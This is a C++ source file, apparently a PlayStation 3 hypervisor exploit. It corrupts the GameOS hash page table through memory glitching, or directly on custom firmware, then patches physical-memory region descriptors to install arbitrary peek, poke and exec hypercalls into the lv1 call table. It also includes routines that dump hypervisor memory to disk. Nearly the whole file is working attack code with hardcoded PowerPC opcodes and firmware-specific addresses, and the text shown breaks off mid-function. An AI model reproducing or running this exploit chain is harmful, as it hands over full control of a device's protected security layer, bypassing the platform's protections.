#include "Include.h"

bool IsExploited()
{
	uint64_t lpar_addr;

	int32_t res;

	res = lv1_map_physical_address_region(0, EXP_4KB, SIZE_4KB, &lpar_addr);

	if (res != 0)
		return false;

	res = lv1_unmap_physical_address_region(lpar_addr);

	if (res != 0)
	{
		PrintLog("lv1_unmap_physical_address_region failed!, res = %d\n", res);

		abort();
		return false;
	}

	return true;
}

static const size_t _junkSize = (4 * 1024 * 1024) / 8;

volatile uint64_t _junk[_junkSize];
volatile uint64_t _junk2[_junkSize];

void ClearDataCache()
{
	eieio();

	for (size_t i = 0; i < _junkSize; i++)
	{
		volatile uint64_t v = _junk[i];
		volatile uint64_t v2 = _junk2[i];

		v = v2;
		v2 = v;
	}

	for (size_t i = 0; i < _junkSize; i++)
	{
		volatile uint64_t v = _junk[i];
		volatile uint64_t v2 = _junk2[i];

		_junk[i] = v2;
		_junk2[i] = v;
	}

	eieio();
}

double fwVersion = 0.0;

static const uint64_t GameOS_HTAB_EA_Addr = 0x800000000F000000;
static const size_t GameOS_HTAB_SizeInBytes = 0x40000;

static const uint32_t glitch_htab_begin_idx = 1000;
static const uint32_t glitch_htab_end_idx = 15000;

static const uint32_t glitch_free_htab_begin_idx = 5000;
static const uint32_t glitch_free_htab_end_idx = 8000;

HTABE GameOS_HTAB_TmpBuf[HTAB_COUNT];

uint64_t CalcHTAB_EA_Addr_By_HtabIdx(uint64_t base, uint32_t htab_idx)
{
	return base + (htab_idx * sizeof(HTABE));
}

uint64_t CalcGameOSHTAB_EA_Addr_By_HtabIdx(uint32_t htab_idx)
{
	return GameOS_HTAB_EA_Addr + (htab_idx * sizeof(HTABE));
}

uint32_t FindFreeHTABIdx()
{
	uint32_t htab_idx;

	HTABE htabe;

	for (htab_idx = glitch_free_htab_begin_idx; htab_idx < glitch_free_htab_end_idx; htab_idx++)
	{
		lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

		if (!HTABE_IS_VALID(htabe))
			return htab_idx;
	}

	PrintLog("Can't find free htab!!!\n");
	abort();

	return 0;
}

uint32_t FindBadHTABIdx()
{
	uint32_t htab_idx;

	HTABE htabe;

	for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
	{
		lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

		if (HTABE_IS_VALID(htabe) && (HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) == SPECIAL_VA)
			return htab_idx;
	}

	PrintLog("Can't find bad htab!!!\n");
	abort();

	return 0;
}

bool FoundBadHTABIdx()
{
	uint32_t htab_idx;

	HTABE htabe;

	for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
	{
		lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

		if (HTABE_IS_VALID(htabe) && (HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) == SPECIAL_VA)
			return true;
	}

	return false;
}

void FindFirstLargestConsecutiveFreeHtabIdx(uint32_t *outIdx, uint32_t *outCount)
{
	uint32_t curLargestConsecutiveFreeCount = 0;
	uint32_t curLargestConsecutiveFreeFirstIdx = 0;

	uint32_t curFreeCount = 0;
	uint32_t curFreeFirstIdx = 0;

	HTABE htabe;

	uint32_t htab_idx;

	for (htab_idx = 0; htab_idx < HTAB_COUNT; htab_idx++)
	{
		lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

		if (HTABE_IS_VALID(htabe))
		{
			curFreeCount = 0;
			continue;
		}

		if (curFreeCount == 0)
			curFreeFirstIdx = htab_idx;

		curFreeCount++;

		if (curFreeCount > curLargestConsecutiveFreeCount)
		{
			curLargestConsecutiveFreeCount = curFreeCount;
			curLargestConsecutiveFreeFirstIdx = curFreeFirstIdx;
		}
	}

	if (outIdx)
		*outIdx = curLargestConsecutiveFreeFirstIdx;

	if (outCount)
		*outCount = curLargestConsecutiveFreeCount;
}

void PrintSingleHTAB(const HTABE *htab)
{
	PrintLog("0x%016lx => 0x%016lx  %d (%d:%d:%d:%d:%d:%d:%d)  0x%016lx, 0x%016lx\n",
			 (uint64_t)HTABE_GET_VA((*htab)), (uint64_t)HTABE_GET_RA((*htab)),
			 (uint32_t)htab->V, (uint32_t)htab->L, (uint32_t)htab->W,
			 (uint32_t)htab->I, (uint32_t)htab->M, (uint32_t)htab->G,
			 (uint32_t)htab->N, (uint32_t)htab->PP, htab->Num[0], htab->Num[1]);
}

void PrintHTABBase(uint64_t base)
{
	PrintLog("PrintHTABBase()...\n");

	static const uint64_t dumpSize = GameOS_HTAB_SizeInBytes;
	uint64_t dumpAddr = base;

	static const uint32_t htabCount = HTAB_COUNT;

	uint8_t *buf = (uint8_t *)malloc(dumpSize);

	lv2_read(dumpAddr, dumpSize, buf);

	HTABE *htab = (HTABE *)buf;

	PrintLog("       Virtual Address       Real Address        V  L W I M G N PP    Num1     Num2\n");

	for (uint32_t htab_idx = 0; htab_idx < htabCount; htab_idx++)
	{
		PrintLog("%u) 0x%016lx => 0x%016lx  %d (%d:%d:%d:%d:%d:%d:%d) 0x%016lx, 0x%016lx\n",
				 htab_idx, (uint64_t)HTABE_GET_VA(htab[htab_idx]), (uint64_t)HTABE_GET_RA(htab[htab_idx]),
				 (uint32_t)htab[htab_idx].V, (uint32_t)htab[htab_idx].L, (uint32_t)htab[htab_idx].W,
				 (uint32_t)htab[htab_idx].I, (uint32_t)htab[htab_idx].M, (uint32_t)htab[htab_idx].G,
				 (uint32_t)htab[htab_idx].N, (uint32_t)htab[htab_idx].PP, htab[htab_idx].Num[0], htab[htab_idx].Num[1]);
	}

	free(buf);
}

void PrintHTAB()
{
	PrintLog("PrintHTAB()...\n");

	PrintHTABBase(GameOS_HTAB_EA_Addr);
}

void PrintHTABBaseValidOnly(uint64_t base)
{
	PrintLog("PrintHTABBaseValidOnly()...\n");

	static const uint64_t dumpSize = GameOS_HTAB_SizeInBytes;
	uint64_t dumpAddr = base;

	static const uint32_t htabCount = HTAB_COUNT;

	uint8_t *buf = (uint8_t *)malloc(dumpSize);

	lv2_read(dumpAddr, dumpSize, buf);

	HTABE *htab = (HTABE *)buf;

	PrintLog("       Virtual Address       Real Address        V  L W I M G N PP    Num1     Num2\n");

	for (uint32_t htab_idx = 0; htab_idx < htabCount; htab_idx++)
	{
		if (!HTABE_IS_VALID(htab[htab_idx]))
			continue;

		PrintLog("%u) 0x%016lx => 0x%016lx  %d (%d:%d:%d:%d:%d:%d:%d) 0x%016lx, 0x%016lx\n",
				 htab_idx, (uint64_t)HTABE_GET_VA(htab[htab_idx]), (uint64_t)HTABE_GET_RA(htab[htab_idx]),
				 (uint32_t)htab[htab_idx].V, (uint32_t)htab[htab_idx].L, (uint32_t)htab[htab_idx].W,
				 (uint32_t)htab[htab_idx].I, (uint32_t)htab[htab_idx].M, (uint32_t)htab[htab_idx].G,
				 (uint32_t)htab[htab_idx].N, (uint32_t)htab[htab_idx].PP, htab[htab_idx].Num[0], htab[htab_idx].Num[1]);
	}

	free(buf);
}

void PrintHTABValidOnly()
{
	PrintLog("PrintHTABValidOnly()...\n");

	PrintHTABBaseValidOnly(GameOS_HTAB_EA_Addr);
}

void Stage1()
{
	PrintLog("Stage1...\n");

	if (IsExploited())
	{
		PrintLog("Already exploited, skipping...\n");
		return;
	}

	if (FoundBadHTABIdx())
	{
		PrintLog("Already have bad htab, skipping...\n");
		return;
	}

	uint64_t loopCount = 0;

	uint32_t writeCount = 0;
	uint32_t readCount = 0;

	while (1)
	{
		bool stop = false;

		int32_t res;

		uint64_t lpar_addr;
		uint64_t muid;

		res = lv1_allocate_memory(SIZE_4KB, EXP_4KB, 0, 0, &lpar_addr, &muid);

		if (res != 0)
		{
			PrintLog("lv1_allocate_memory failed, res = %d\n", res);

			abort();
			return;
		}

		{
			HTABE htabe;

			uint32_t htab_idx;

			for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
			{
				lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

				if (HTABE_IS_VALID(htabe))
					continue;

				htabe_set_lpar(&htabe,
							   CALC_SPECIAL_VA(SPECIAL_VA, htab_idx), SPECIAL_VA_FLAGS_VALID,
							   lpar_addr, SPECIAL_RA_FLAGS_READWRITE);

				res = lv1_write_htab_entry(0, htab_idx, htabe.Num[0], htabe.Num[1]);

				if (res != 0)
				{
					PrintLog("lv1_write_htab_entry failed, htab_idx = %u, num0 = %lx, num1 = %lx, res = %d\n",
							 htab_idx, htabe.Num[0], htabe.Num[1], res);
				}

				writeCount++;
			}
		}

		// We should do memory glitch at this line
		// Sadly this is very painful on GameOS because unlike linux version
		// They can halt everything except exploit itself
		// This is not possible here, so we end up corrupt many things in the process
		res = lv1_release_memory(lpar_addr);

		if (res != 0)
		{
			PrintLog("lv1_release_memory failed, res = %d\n", res);

			abort();
			return;
		}

		{
			HTABE htabe;

			uint32_t htab_idx;

			uint32_t count = 0;

			ClearDataCache();

			for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
			{
				uint64_t ea = CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx);

				lv2_read(ea, sizeof(HTABE), &htabe);

				if ((HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) == SPECIAL_VA)
					readCount++;

				if (!HTABE_IS_VALID(htabe) || (HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) != SPECIAL_VA)
					continue;

				PrintLog("Bad HTAB found!!!, htab_idx = %u\n", htab_idx);

				if (count == 0)
				{
					lv2_beep_triple();
					Sleep(1);
					lv2_beep_triple();
					Sleep(2);
					lv2_beep_triple();
					Sleep(2);
					lv2_beep_triple();
					Sleep(2);
				}

				PrintSingleHTAB(&htabe);

				count++;
				stop = true;
			}
		}

		if (stop)
		{
			// PrintHTAB();
			break;
		}

		loopCount++;

		if ((loopCount % 5) == 0)
		{
			PrintLog("still alive... %lu, writeCount = %u, readCount = %u, delta = %d\n", loopCount, writeCount, readCount, (writeCount - readCount));

			lv2_beep_single();

			writeCount = 0;
			readCount = 0;
		}
	}
}

void Stage1_v2()
{
	PrintLog("Stage1_v2...\n");

	if (IsExploited())
	{
		PrintLog("Already exploited, skipping...\n");
		return;
	}

	if (FoundBadHTABIdx())
	{
		PrintLog("Already have bad htab, skipping...\n");
		return;
	}

	Glitcher_Init();

	uint64_t loopCount = 0;

	uint32_t writeCount = 0;
	uint32_t readCount = 0;

	uint64_t sumtdelta = 0;

	uint64_t doGlitchWhen = 5;

	while (1)
	{
		bool stop = false;

		int32_t res;

		uint64_t lpar_addr;
		uint64_t muid;

		res = lv1_allocate_memory(SIZE_4KB, EXP_4KB, 0, 0, &lpar_addr, &muid);

		if (res != 0)
		{
			PrintLog("lv1_allocate_memory failed, res = %d\n", res);

			abort();
			return;
		}

		{
			HTABE htabe;

			uint32_t htab_idx;

			for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
			{
				lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

				if (HTABE_IS_VALID(htabe))
					continue;

				htabe_set_lpar(&htabe,
							   CALC_SPECIAL_VA(SPECIAL_VA, htab_idx), SPECIAL_VA_FLAGS_VALID,
							   lpar_addr, SPECIAL_RA_FLAGS_READWRITE);

				res = lv1_write_htab_entry(0, htab_idx, htabe.Num[0], htabe.Num[1]);

				if (res != 0)
				{
					PrintLog("lv1_write_htab_entry failed, htab_idx = %u, num0 = %lx, num1 = %lx, res = %d\n",
							 htab_idx, htabe.Num[0], htabe.Num[1], res);
				}

				writeCount++;
			}
		}

		eieio();
		if (loopCount >= doGlitchWhen)
			Glitcher_Start();
		uint64_t t1 = GetTimeInUs();

		res = lv2_lv1_release_memory_intr(lpar_addr);
		// res = lv1_release_memory(lpar_addr);

		uint64_t t2 = GetTimeInUs();
		if (loopCount >= doGlitchWhen)
			Glitcher_Stop();
		eieio();

		if (res != 0)
		{
			PrintLog("lv1_release_memory failed, res = %d\n", res);

			abort();
			return;
		}

		sumtdelta += (t2 - t1);

		{
			HTABE htabe;

			uint32_t htab_idx;

			uint32_t count = 0;

			ClearDataCache();

			for (htab_idx = glitch_htab_begin_idx; htab_idx < glitch_htab_end_idx; htab_idx++)
			{
				uint64_t ea = CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx);

				lv2_read(ea, sizeof(HTABE), &htabe);

				if ((HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) == SPECIAL_VA)
					readCount++;

				if (!HTABE_IS_VALID(htabe) || (HTABE_GET_VA(htabe) & SPECIAL_VA_MASK) != SPECIAL_VA)
					continue;

				PrintLog("Bad HTAB found!!!, htab_idx = %u\n", htab_idx);

				if (count == 0)
				{
					lv2_beep_triple();
					Sleep(1);
					lv2_beep_triple();
					Sleep(2);
					lv2_beep_triple();
					Sleep(2);
					lv2_beep_triple();
					Sleep(2);
				}

				PrintSingleHTAB(&htabe);

				count++;
				stop = true;
			}
		}

		if (stop)
		{
			// PrintHTAB();
			break;
		}

		loopCount++;

		static const uint64_t zzz = 1;
		if ((loopCount % zzz) == 0)
		{
			PrintLog("still alive... %lu, writeCount = %u, readCount = %u, delta = %d, avgtdelta = %luus\n",
					 loopCount, writeCount, readCount, (writeCount - readCount), (sumtdelta / zzz));

			lv2_beep_single();

			writeCount = 0;
			readCount = 0;

			sumtdelta = 0;
		}

		WaitInMs(100);
	}

	Glitcher_Destroy();
}

// CFW don't need glitching
// requires lv1 htab write protection patch
void Stage1_CFW()
{
	PrintLog("Stage1_CFW()\n");

	if (FoundBadHTABIdx())
	{
		PrintLog("Already have bad htab, skipping...\n");
		return;
	}

	int32_t res;

	uint64_t old_vas_id;

	res = lv1_get_virtual_address_space_id_of_ppe(PPE_ID0, &old_vas_id);

	if (res != 0)
	{
		PrintLog("lv1_get_virtual_address_space_id_of_ppe failed!!!, res = %d\n", res);

		abort();
		return;
	}

	PrintLog("old_vas_id = %lu\n", old_vas_id);

	uint64_t old_htab_lpar_addr = 0;
	res = lv1_map_htab(old_vas_id, &old_htab_lpar_addr);

	if (res != 0)
	{
		PrintLog("lv1_map_htab failed!!!, res = %d\n", res);

		abort();
		return;
	}

	PrintLog("old_htab_lpar_addr = 0x%lx\n", old_htab_lpar_addr);

	uint64_t old_htab_ea = 0x8000000014000000ul;
	map_lpar_to_lv2_ea(old_htab_lpar_addr, old_htab_ea, GameOS_HTAB_SizeInBytes, false, false);

	uint64_t lpar_addr;
	uint64_t muid;

	res = lv1_allocate_memory(SIZE_256KB, EXP_256KB, 0, 0, &lpar_addr, &muid);

	if (res != 0)
	{
		PrintLog("lv1_allocate_memory failed, res = %d\n", res);

		abort();
		return;
	}

	PrintLog("lpar_addr = 0x%lx\n", lpar_addr);

	uint32_t htab_idx = FindFreeHTABIdx();

	{
		HTABE htabe;

		htabe_set_lpar(&htabe,
					   CALC_SPECIAL_VA(SPECIAL_VA, htab_idx), SPECIAL_VA_FLAGS_VALID,
					   lpar_addr, SPECIAL_RA_FLAGS_READWRITE);

		res = lv1_write_htab_entry(0, htab_idx, htabe.Num[0], htabe.Num[1]);

		if (res != 0)
		{
			PrintLog("lv1_write_htab_entry failed, htab_idx = %u, num0 = %lx, num1 = %lx, res = %d\n",
					 htab_idx, htabe.Num[0], htabe.Num[1], res);

			abort();
		}
	}

	res = lv1_release_memory(lpar_addr);

	if (res != 0)
	{
		PrintLog("lv1_release_memory failed, res = %d\n", res);

		abort();
		return;
	}

	{
		HTABE htabe;

		lv2_read(CalcHTAB_EA_Addr_By_HtabIdx(old_htab_ea, htab_idx), sizeof(HTABE), &htabe);
		PrintSingleHTAB(&htabe);

		htabe.V = 1;
		lv2_write(CalcHTAB_EA_Addr_By_HtabIdx(old_htab_ea, htab_idx), sizeof(HTABE), &htabe);
		PrintSingleHTAB(&htabe);
	}

	res = lv1_unmap_htab(old_htab_lpar_addr);

	if (res != 0)
	{
		PrintLog("lv1_unmap_htab failed!!!, res = %d\n", res);

		abort();
		return;
	}

	PrintLog("Bad HTAB Idx = %u, htab_idx = %u\n", FindBadHTABIdx(), htab_idx);

	PrintLog("Stage1_CFW done\n");
}

// offset in bytes:

// -80 = size
// 0 = ra
// 88 = lpar

struct DMMR_s
{
public:
	uint64_t ra;
	uint64_t size;
	uint64_t lpar_addr;
};

static const uint32_t dmmr_count = 512;
DMMR_s dmmrs[dmmr_count];

void Stage2_Hvcall()
{
	PrintLog("Stage2_Hvcall()\n");

#if 1
	if (IsExploited())
	{
		PrintLog("Already exploited, skipping...\n");
		return;
	}
#endif

	int32_t res;

	PrintLog("Allocating dmmrs\n");

	for (uint32_t i = 0; i < dmmr_count; i++)
	{
		DMMR_s *dmmr = &dmmrs[i];

		dmmr->ra = 0x28080000000ul + (i * 4096);
		// dmmr->size = 4096;
		dmmr->size = 0;
		dmmr->lpar_addr = 0;

		res = lv1_map_physical_address_region(dmmr->ra, EXP_4KB, dmmr->size, &dmmr->lpar_addr);

		if (res != 0)
		{
			PrintLog("lv1_map_physical_address_region failed!!!, res = %d\n", res);

			dmmr->lpar_addr = 0;
			break;
		}

		PrintLog("dmmr %u, ra = 0x%lx, size = %lu, lpar_addr = 0x%lx\n", i, dmmr->ra, dmmr->size, dmmr->lpar_addr);
	}

	//

	uint32_t htab_idx = FindBadHTABIdx();

	HTABE htabe;
	lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);

	uint64_t htabe_ra = HTABE_GET_RA(htabe);

	PrintLog("bad htab_idx = %u, ra = 0x%lx\n", htab_idx, htabe_ra);

	//

	uint64_t *our_rw = (uint64_t *)CALC_SPECIAL_EA(SPECIAL_EA, htab_idx, htabe);
	// uint8_t* our_rw_u8 = (uint8_t*)our_rw;

	PrintLog("Checking for overlap...\n");

	static const uint32_t need_overlap_dmmi_count = 1;

	uint32_t found = 0;

	uint64_t found_i[need_overlap_dmmi_count];

	DMMR_s *found_overlap_dmmr[need_overlap_dmmi_count];
	uint32_t found_overlap_dmmr_i[need_overlap_dmmi_count];

	for (uint32_t i = 0; i < need_overlap_dmmi_count; i++)
	{
		found_i[i] = 0;

		found_overlap_dmmr[i] = NULL;
		found_overlap_dmmr_i[i] = 0;
	}

	for (uint64_t i = 12; i < 4096 / 8; i++)
	{
		slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
		uint64_t v = our_rw[i];
		slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
		uint64_t vsize = our_rw[i - 10];
		slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
		uint64_t vlpar = our_rw[i + 11];

		// PrintLog("v = %lx\n", v);

		for (uint32_t i2 = 0; i2 < dmmr_count; i2++)
		{
			DMMR_s *dmmr = &dmmrs[i2];

			if (dmmr->lpar_addr == 0)
				continue;

			if ((v == dmmr->ra) && (vsize == dmmr->size) && (vlpar == dmmr->lpar_addr))
			{
				found_i[found] = i;

				found_overlap_dmmr[found] = dmmr;
				found_overlap_dmmr_i[found] = i2;

				found++;
				break;
			}
		}

		if (found == need_overlap_dmmi_count)
			break;
	}

	if (found != need_overlap_dmmi_count)
	{
		PrintLog("Not found, abort!\n");

		PrintLog("Cleanup...\n");

		for (uint32_t i = 0; i < dmmr_count; i++)
		{
			DMMR_s *dmmr = &dmmrs[i];

			if (dmmr->lpar_addr == 0)
				continue;

			res = lv1_unmap_physical_address_region(dmmr->lpar_addr);

			if (res != 0)
			{
				PrintLog("lv1_unmap_physical_address_region failed!!!, res = %d\n", res);

				abort();
				return;
			}
		}

		abort();
		return;
	}

	for (uint32_t i = 0; i < need_overlap_dmmi_count; i++)
	{
		DMMR_s *d = found_overlap_dmmr[i];

		PrintLog("Found!, %lu, dmmr %u, ra = 0x%lx, size = %lu, lpar_addr = 0x%lx\n",
				 found_i[i], found_overlap_dmmr_i[i], d->ra, d->size, d->lpar_addr);
	}

	//

	PrintLog("Cleanup unneeded dmmrs ...\n");

	for (uint32_t i = 0; i < dmmr_count; i++)
	{
		DMMR_s *dmmr = &dmmrs[i];

		if (dmmr->lpar_addr == 0)
			continue;

		bool skip = false;

		for (uint32_t i2 = 0; i2 < need_overlap_dmmi_count; i2++)
		{
			if (dmmr == found_overlap_dmmr[i2])
			{
				skip = true;
				break;
			}
		}

		if (skip)
			continue;

		res = lv1_unmap_physical_address_region(dmmr->lpar_addr);

		if (res != 0)
		{
			PrintLog("lv1_unmap_physical_address_region failed!!!, res = %d\n", res);

			abort();
			return;
		}

		dmmr->lpar_addr = 0;
	}

	PrintLog("Cleanup done\n");

	uint64_t code_ra;

	uint64_t code_ra_peek;
	uint64_t code_ra_poke;
	uint64_t code_ra_exec;

	{
		PrintLog("Generating our hvcall code...\n");

		uint64_t muid;
		res = lv1_allocate_memory(SIZE_4KB, EXP_4KB, 0, 0, &_our_hvcall_lpar_addr, &muid);

		if (res != 0)
		{
			PrintLog("lv1_allocate_memory failed!, res = %d\n", res);

			abort();
			return;
		}

		PrintLog("our_hvcall_lpar_addr = 0x%lx\n", _our_hvcall_lpar_addr);

		code_ra = htab_ra_from_lpar(_our_hvcall_lpar_addr);
		PrintLog("ra = 0x%lx\n", code_ra);

		uint64_t ea = 0x8000000016000000ul;
		map_lpar_to_lv2_ea(_our_hvcall_lpar_addr, ea, SIZE_4KB, false, true);

		{
			uint64_t curOffset = 0;

			code_ra_peek = code_ra;
			code_ra_poke = code_ra;
			code_ra_exec = code_ra;

			// peek

			{
				code_ra_peek += curOffset;

				// E8 63 00 00 4E 80 00 20

				uint64_t val = 0xE86300004E800020;
				lv2_write(ea + curOffset, 8, &val);
				curOffset += 8;
			}

			// poke

			{
				code_ra_poke += curOffset;

				{
					// F8 83 00 00 38 60 00 00

					uint64_t val = 0xF883000038600000;
					lv2_write(ea + curOffset, 8, &val);
					curOffset += 8;
				}

				{
					// 4E 80 00 20

					uint32_t val = 0x4E800020;
					lv2_write(ea + curOffset, 4, &val);
					curOffset += 4;
				}
			}

			// exec

			{
				code_ra_exec += curOffset;

				{
					// 38 21 FF F0 7C 08 02 A6

					uint64_t val = 0x3821FFF07C0802A6;
					lv2_write(ea + curOffset, 8, &val);
					curOffset += 8;
				}

				{
					// F8 01 00 00 7D 29 03 A6

					uint64_t val = 0xF80100007D2903A6;
					lv2_write(ea + curOffset, 8, &val);
					curOffset += 8;
				}

				{
					// 4E 80 04 21 E8 01 00 00

					uint64_t val = 0x4E800421E8010000;
					lv2_write(ea + curOffset, 8, &val);
					curOffset += 8;
				}

				{
					// 7C 08 03 A6 38 21 00 10

					uint64_t val = 0x7C0803A638210010;
					lv2_write(ea + curOffset, 8, &val);
					curOffset += 8;
				}

				{
					// 4E 80 00 20

					uint32_t val = 0x4E800020;
					lv2_write(ea + curOffset, 4, &val);
					curOffset += 4;
				}
			}
		}

		PrintLog("Generate done\n");
	}

	// Install our hvcall to hvcall table

	{
		static const uint32_t iidx = 0;

		uint64_t want_ra = 0;

		if (fwVersion >= 4.70)
			want_ra = 0x372D08;
		else
		{
			PrintLog("firmware not supported!!!\n");

			abort();
			return;
		}

		_our_hvcall_table_addr = want_ra;
		PrintLog("table_addr = 0x%lx\n", _our_hvcall_table_addr);

		want_ra += (34 * 8);

		uint64_t want_offset = (want_ra % 4096);

		PrintLog("want_ra = 0x%lx, want_offset = %lu\n", want_ra, want_offset);

		//

		uint64_t patched_ra = (want_ra - want_offset); // can be ANY address you want, must be 4096 aligned
		uint64_t patched_size = 4096;				   // this is maximum we can do

		slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
		our_rw[found_i[iidx]] = patched_ra;
		slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
		our_rw[found_i[iidx] - 10] = patched_size;

		if (htab_ra_from_lpar(found_overlap_dmmr[iidx]->lpar_addr) != patched_ra)
		{
			PrintLog("patch ra failed!!! abort()\n");

			abort();
			return;
		}

		PrintLog("patched ra = 0x%lx, size = %lu\n", patched_ra, patched_size);

		found_overlap_dmmr[iidx]->ra = patched_ra;
		found_overlap_dmmr[iidx]->size = patched_size;

		//

		uint64_t dest_ea = 0x8000000014000000ul;
		map_lpar_to_lv2_ea(found_overlap_dmmr[iidx]->lpar_addr, dest_ea, patched_size, false, false);

		PrintLog("Install our hvcall into table now!!!\n");

		// 34 = peek

		{
			//

			uint64_t old;
			lv2_read(dest_ea + want_offset, 8, &old);

			PrintLog("old = 0x%lx\n", old);

			//

			uint64_t newval = code_ra_peek;
			lv2_write(dest_ea + want_offset, 8, &newval);

			PrintLog("new = 0x%lx\n", newval);

			//

			uint64_t newval2;
			lv2_read(dest_ea + want_offset, 8, &newval2);

			PrintLog("new2 = 0x%lx\n", newval2);
		}

		// 35 = poke

		{
			//

			uint64_t old;
			lv2_read(dest_ea + want_offset + 8, 8, &old);

			PrintLog("old = 0x%lx\n", old);

			//

			uint64_t newval = code_ra_poke;
			lv2_write(dest_ea + want_offset + 8, 8, &newval);

			PrintLog("new = 0x%lx\n", newval);

			//

			uint64_t newval2;
			lv2_read(dest_ea + want_offset + 8, 8, &newval2);

			PrintLog("new2 = 0x%lx\n", newval2);
		}

		// 36 = exec

		{
			//

			uint64_t old;
			lv2_read(dest_ea + want_offset + 16, 8, &old);

			PrintLog("old = 0x%lx\n", old);

			//

			uint64_t newval = code_ra_exec;
			lv2_write(dest_ea + want_offset + 16, 8, &newval);

			PrintLog("new = 0x%lx\n", newval);

			//

			uint64_t newval2;
			lv2_read(dest_ea + want_offset + 16, 8, &newval2);

			PrintLog("new2 = 0x%lx\n", newval2);
		}

		res = lv1_unmap_physical_address_region(found_overlap_dmmr[iidx]->lpar_addr);

		if (res != 0)
		{
			PrintLog("lv1_unmap_physical_address_region failed!!!, res = %d\n", res);

			abort();
			return;
		}

		found_overlap_dmmr[iidx]->lpar_addr = 0;
	}

	PrintLog("Patch done!!!\n");

	// cleanup...

	PrintLog("Cleanup...\n");

	for (uint32_t i = 0; i < dmmr_count; i++)
	{
		DMMR_s *dmmr = &dmmrs[i];

		if (dmmr->lpar_addr == 0)
			continue;

		res = lv1_unmap_physical_address_region(dmmr->lpar_addr);

		if (res != 0)
		{
			PrintLog("lv1_unmap_physical_address_region failed!!!, res = %d\n", res);

			abort();
			return;
		}
	}

	eieio();
	isync();

	if (!IsOurHvcallInstalled())
	{
		PrintLog("install our hvcall failed!\n");

		abort();
		return;
	}

	lv1_test_puts();

	PrintLog("Done!\n");
}

void DumpLv2Lv1()
{
	PrintLog("Dumping lv1 through lv2 to /dev_hdd0/lv2_lv1dump.bin ...\n");

	lv2_beep_triple();

	FILE *f = fopen("/dev_hdd0/lv2_lv1dump.bin", "wb");

	size_t dumpSize = 16 * 1024 * 1024;
	uint64_t dumpAddr = 0;

	void *buf = malloc(dumpSize);

	lv2_lv1_read(dumpAddr, dumpSize, buf);

	fwrite(buf, 1, dumpSize, f);

	free(buf);

	fflush(f);
	fclose(f);

	PrintLog("dump done.\n");

	lv2_beep_single();
}

void DumpLv1()
{
	PrintLog("Dumping lv1 to /dev_hdd0/lv1dump.bin ... This may take few minutes......\n");

	lv2_beep_long();

	FILE *f = fopen("/dev_hdd0/lv1dump.bin", "wb");

	size_t dumpSize = 16 * 1024 * 1024;
	uint64_t dumpAddr = 0;

	void *buf = malloc(dumpSize);

	lv1_read(dumpAddr, dumpSize, buf);

	fwrite(buf, 1, dumpSize, f);

	free(buf);

	fflush(f);
	fclose(f);

	PrintLog("dump done.\n");

	lv2_beep_single();
}

void DumpLv1_240M()
{
	PrintLog("Dumping lv1 to /dev_hdd0/lv1dump_240M.bin ... This may take few minutes......\n");

	lv2_beep_long();

	FILE *f = fopen("/dev_hdd0/lv1dump_240M.bin", "wb");

	size_t dumpSize = 240 * 1024 * 1024;
	uint64_t dumpAddr = 0;

	size_t chunkSize = 1 * 1024 * 1024;
	void *buf = malloc(chunkSize);

	size_t left = dumpSize;
	size_t curOffset = dumpAddr;

	while (1)
	{
		size_t readSize = left < chunkSize ? left : chunkSize;

		lv1_read(curOffset, readSize, buf);
		fwrite(buf, 1, readSize, f);

		left -= readSize;
		curOffset += readSize;

		if (left == 0)
			break;
	}

	free(buf);

	fflush(f);
	fclose(f);

	PrintLog("dump done.\n");

	lv2_beep_single();
}

void GlitcherTest()
{
	PrintLog("GlitcherTest()\n");

	Glitcher_Init();

	bool success = false;

	uint64_t size = 1 * 1024 * 1024;
	uint8_t *mem = (uint8_t *)malloc(size);

	PrintLog("mem = 0x%lx, size = %lu\n", (uint64_t)mem, size);

	uint64_t loopCount = 0;

	while (1)
	{
		PrintLog("loopCount = %lu\n", loopCount);
		lv2_beep_single();

		PrintLog("Writing stage1...\n");

		for (uint64_t i = 0; i < size; i++)
		{
			uint64_t addr = (uint64_t)&mem[i];
			uint8_t v = (addr % 255);

			mem[i] = v;
		}

		eieio();

		PrintLog("Writing memory...\n");

		uint64_t writeCount = 0;

#if 0

        //uint64_t maxWriteTimeInMs = 0;
        //uint64_t startTime = GetTimeInMs();
        //uint64_t endTime = startTime + maxWriteTimeInMs;

        eieio();
        Glitcher_Start();
        uint64_t t1 = GetTimeInUs();
        eieio();

        for (uint64_t i = 0; i < size; i++)
        {
            uint64_t addr = (uint64_t)&mem[i];
            //uint8_t v = (255 - (addr % 255));
            uint8_t v = 0x69;

            mem[i] = v;

            writeCount++;

            //if (maxWriteTimeInMs != 0)
            //{
            //    if (GetTimeInMs() >= endTime)
             //       break;
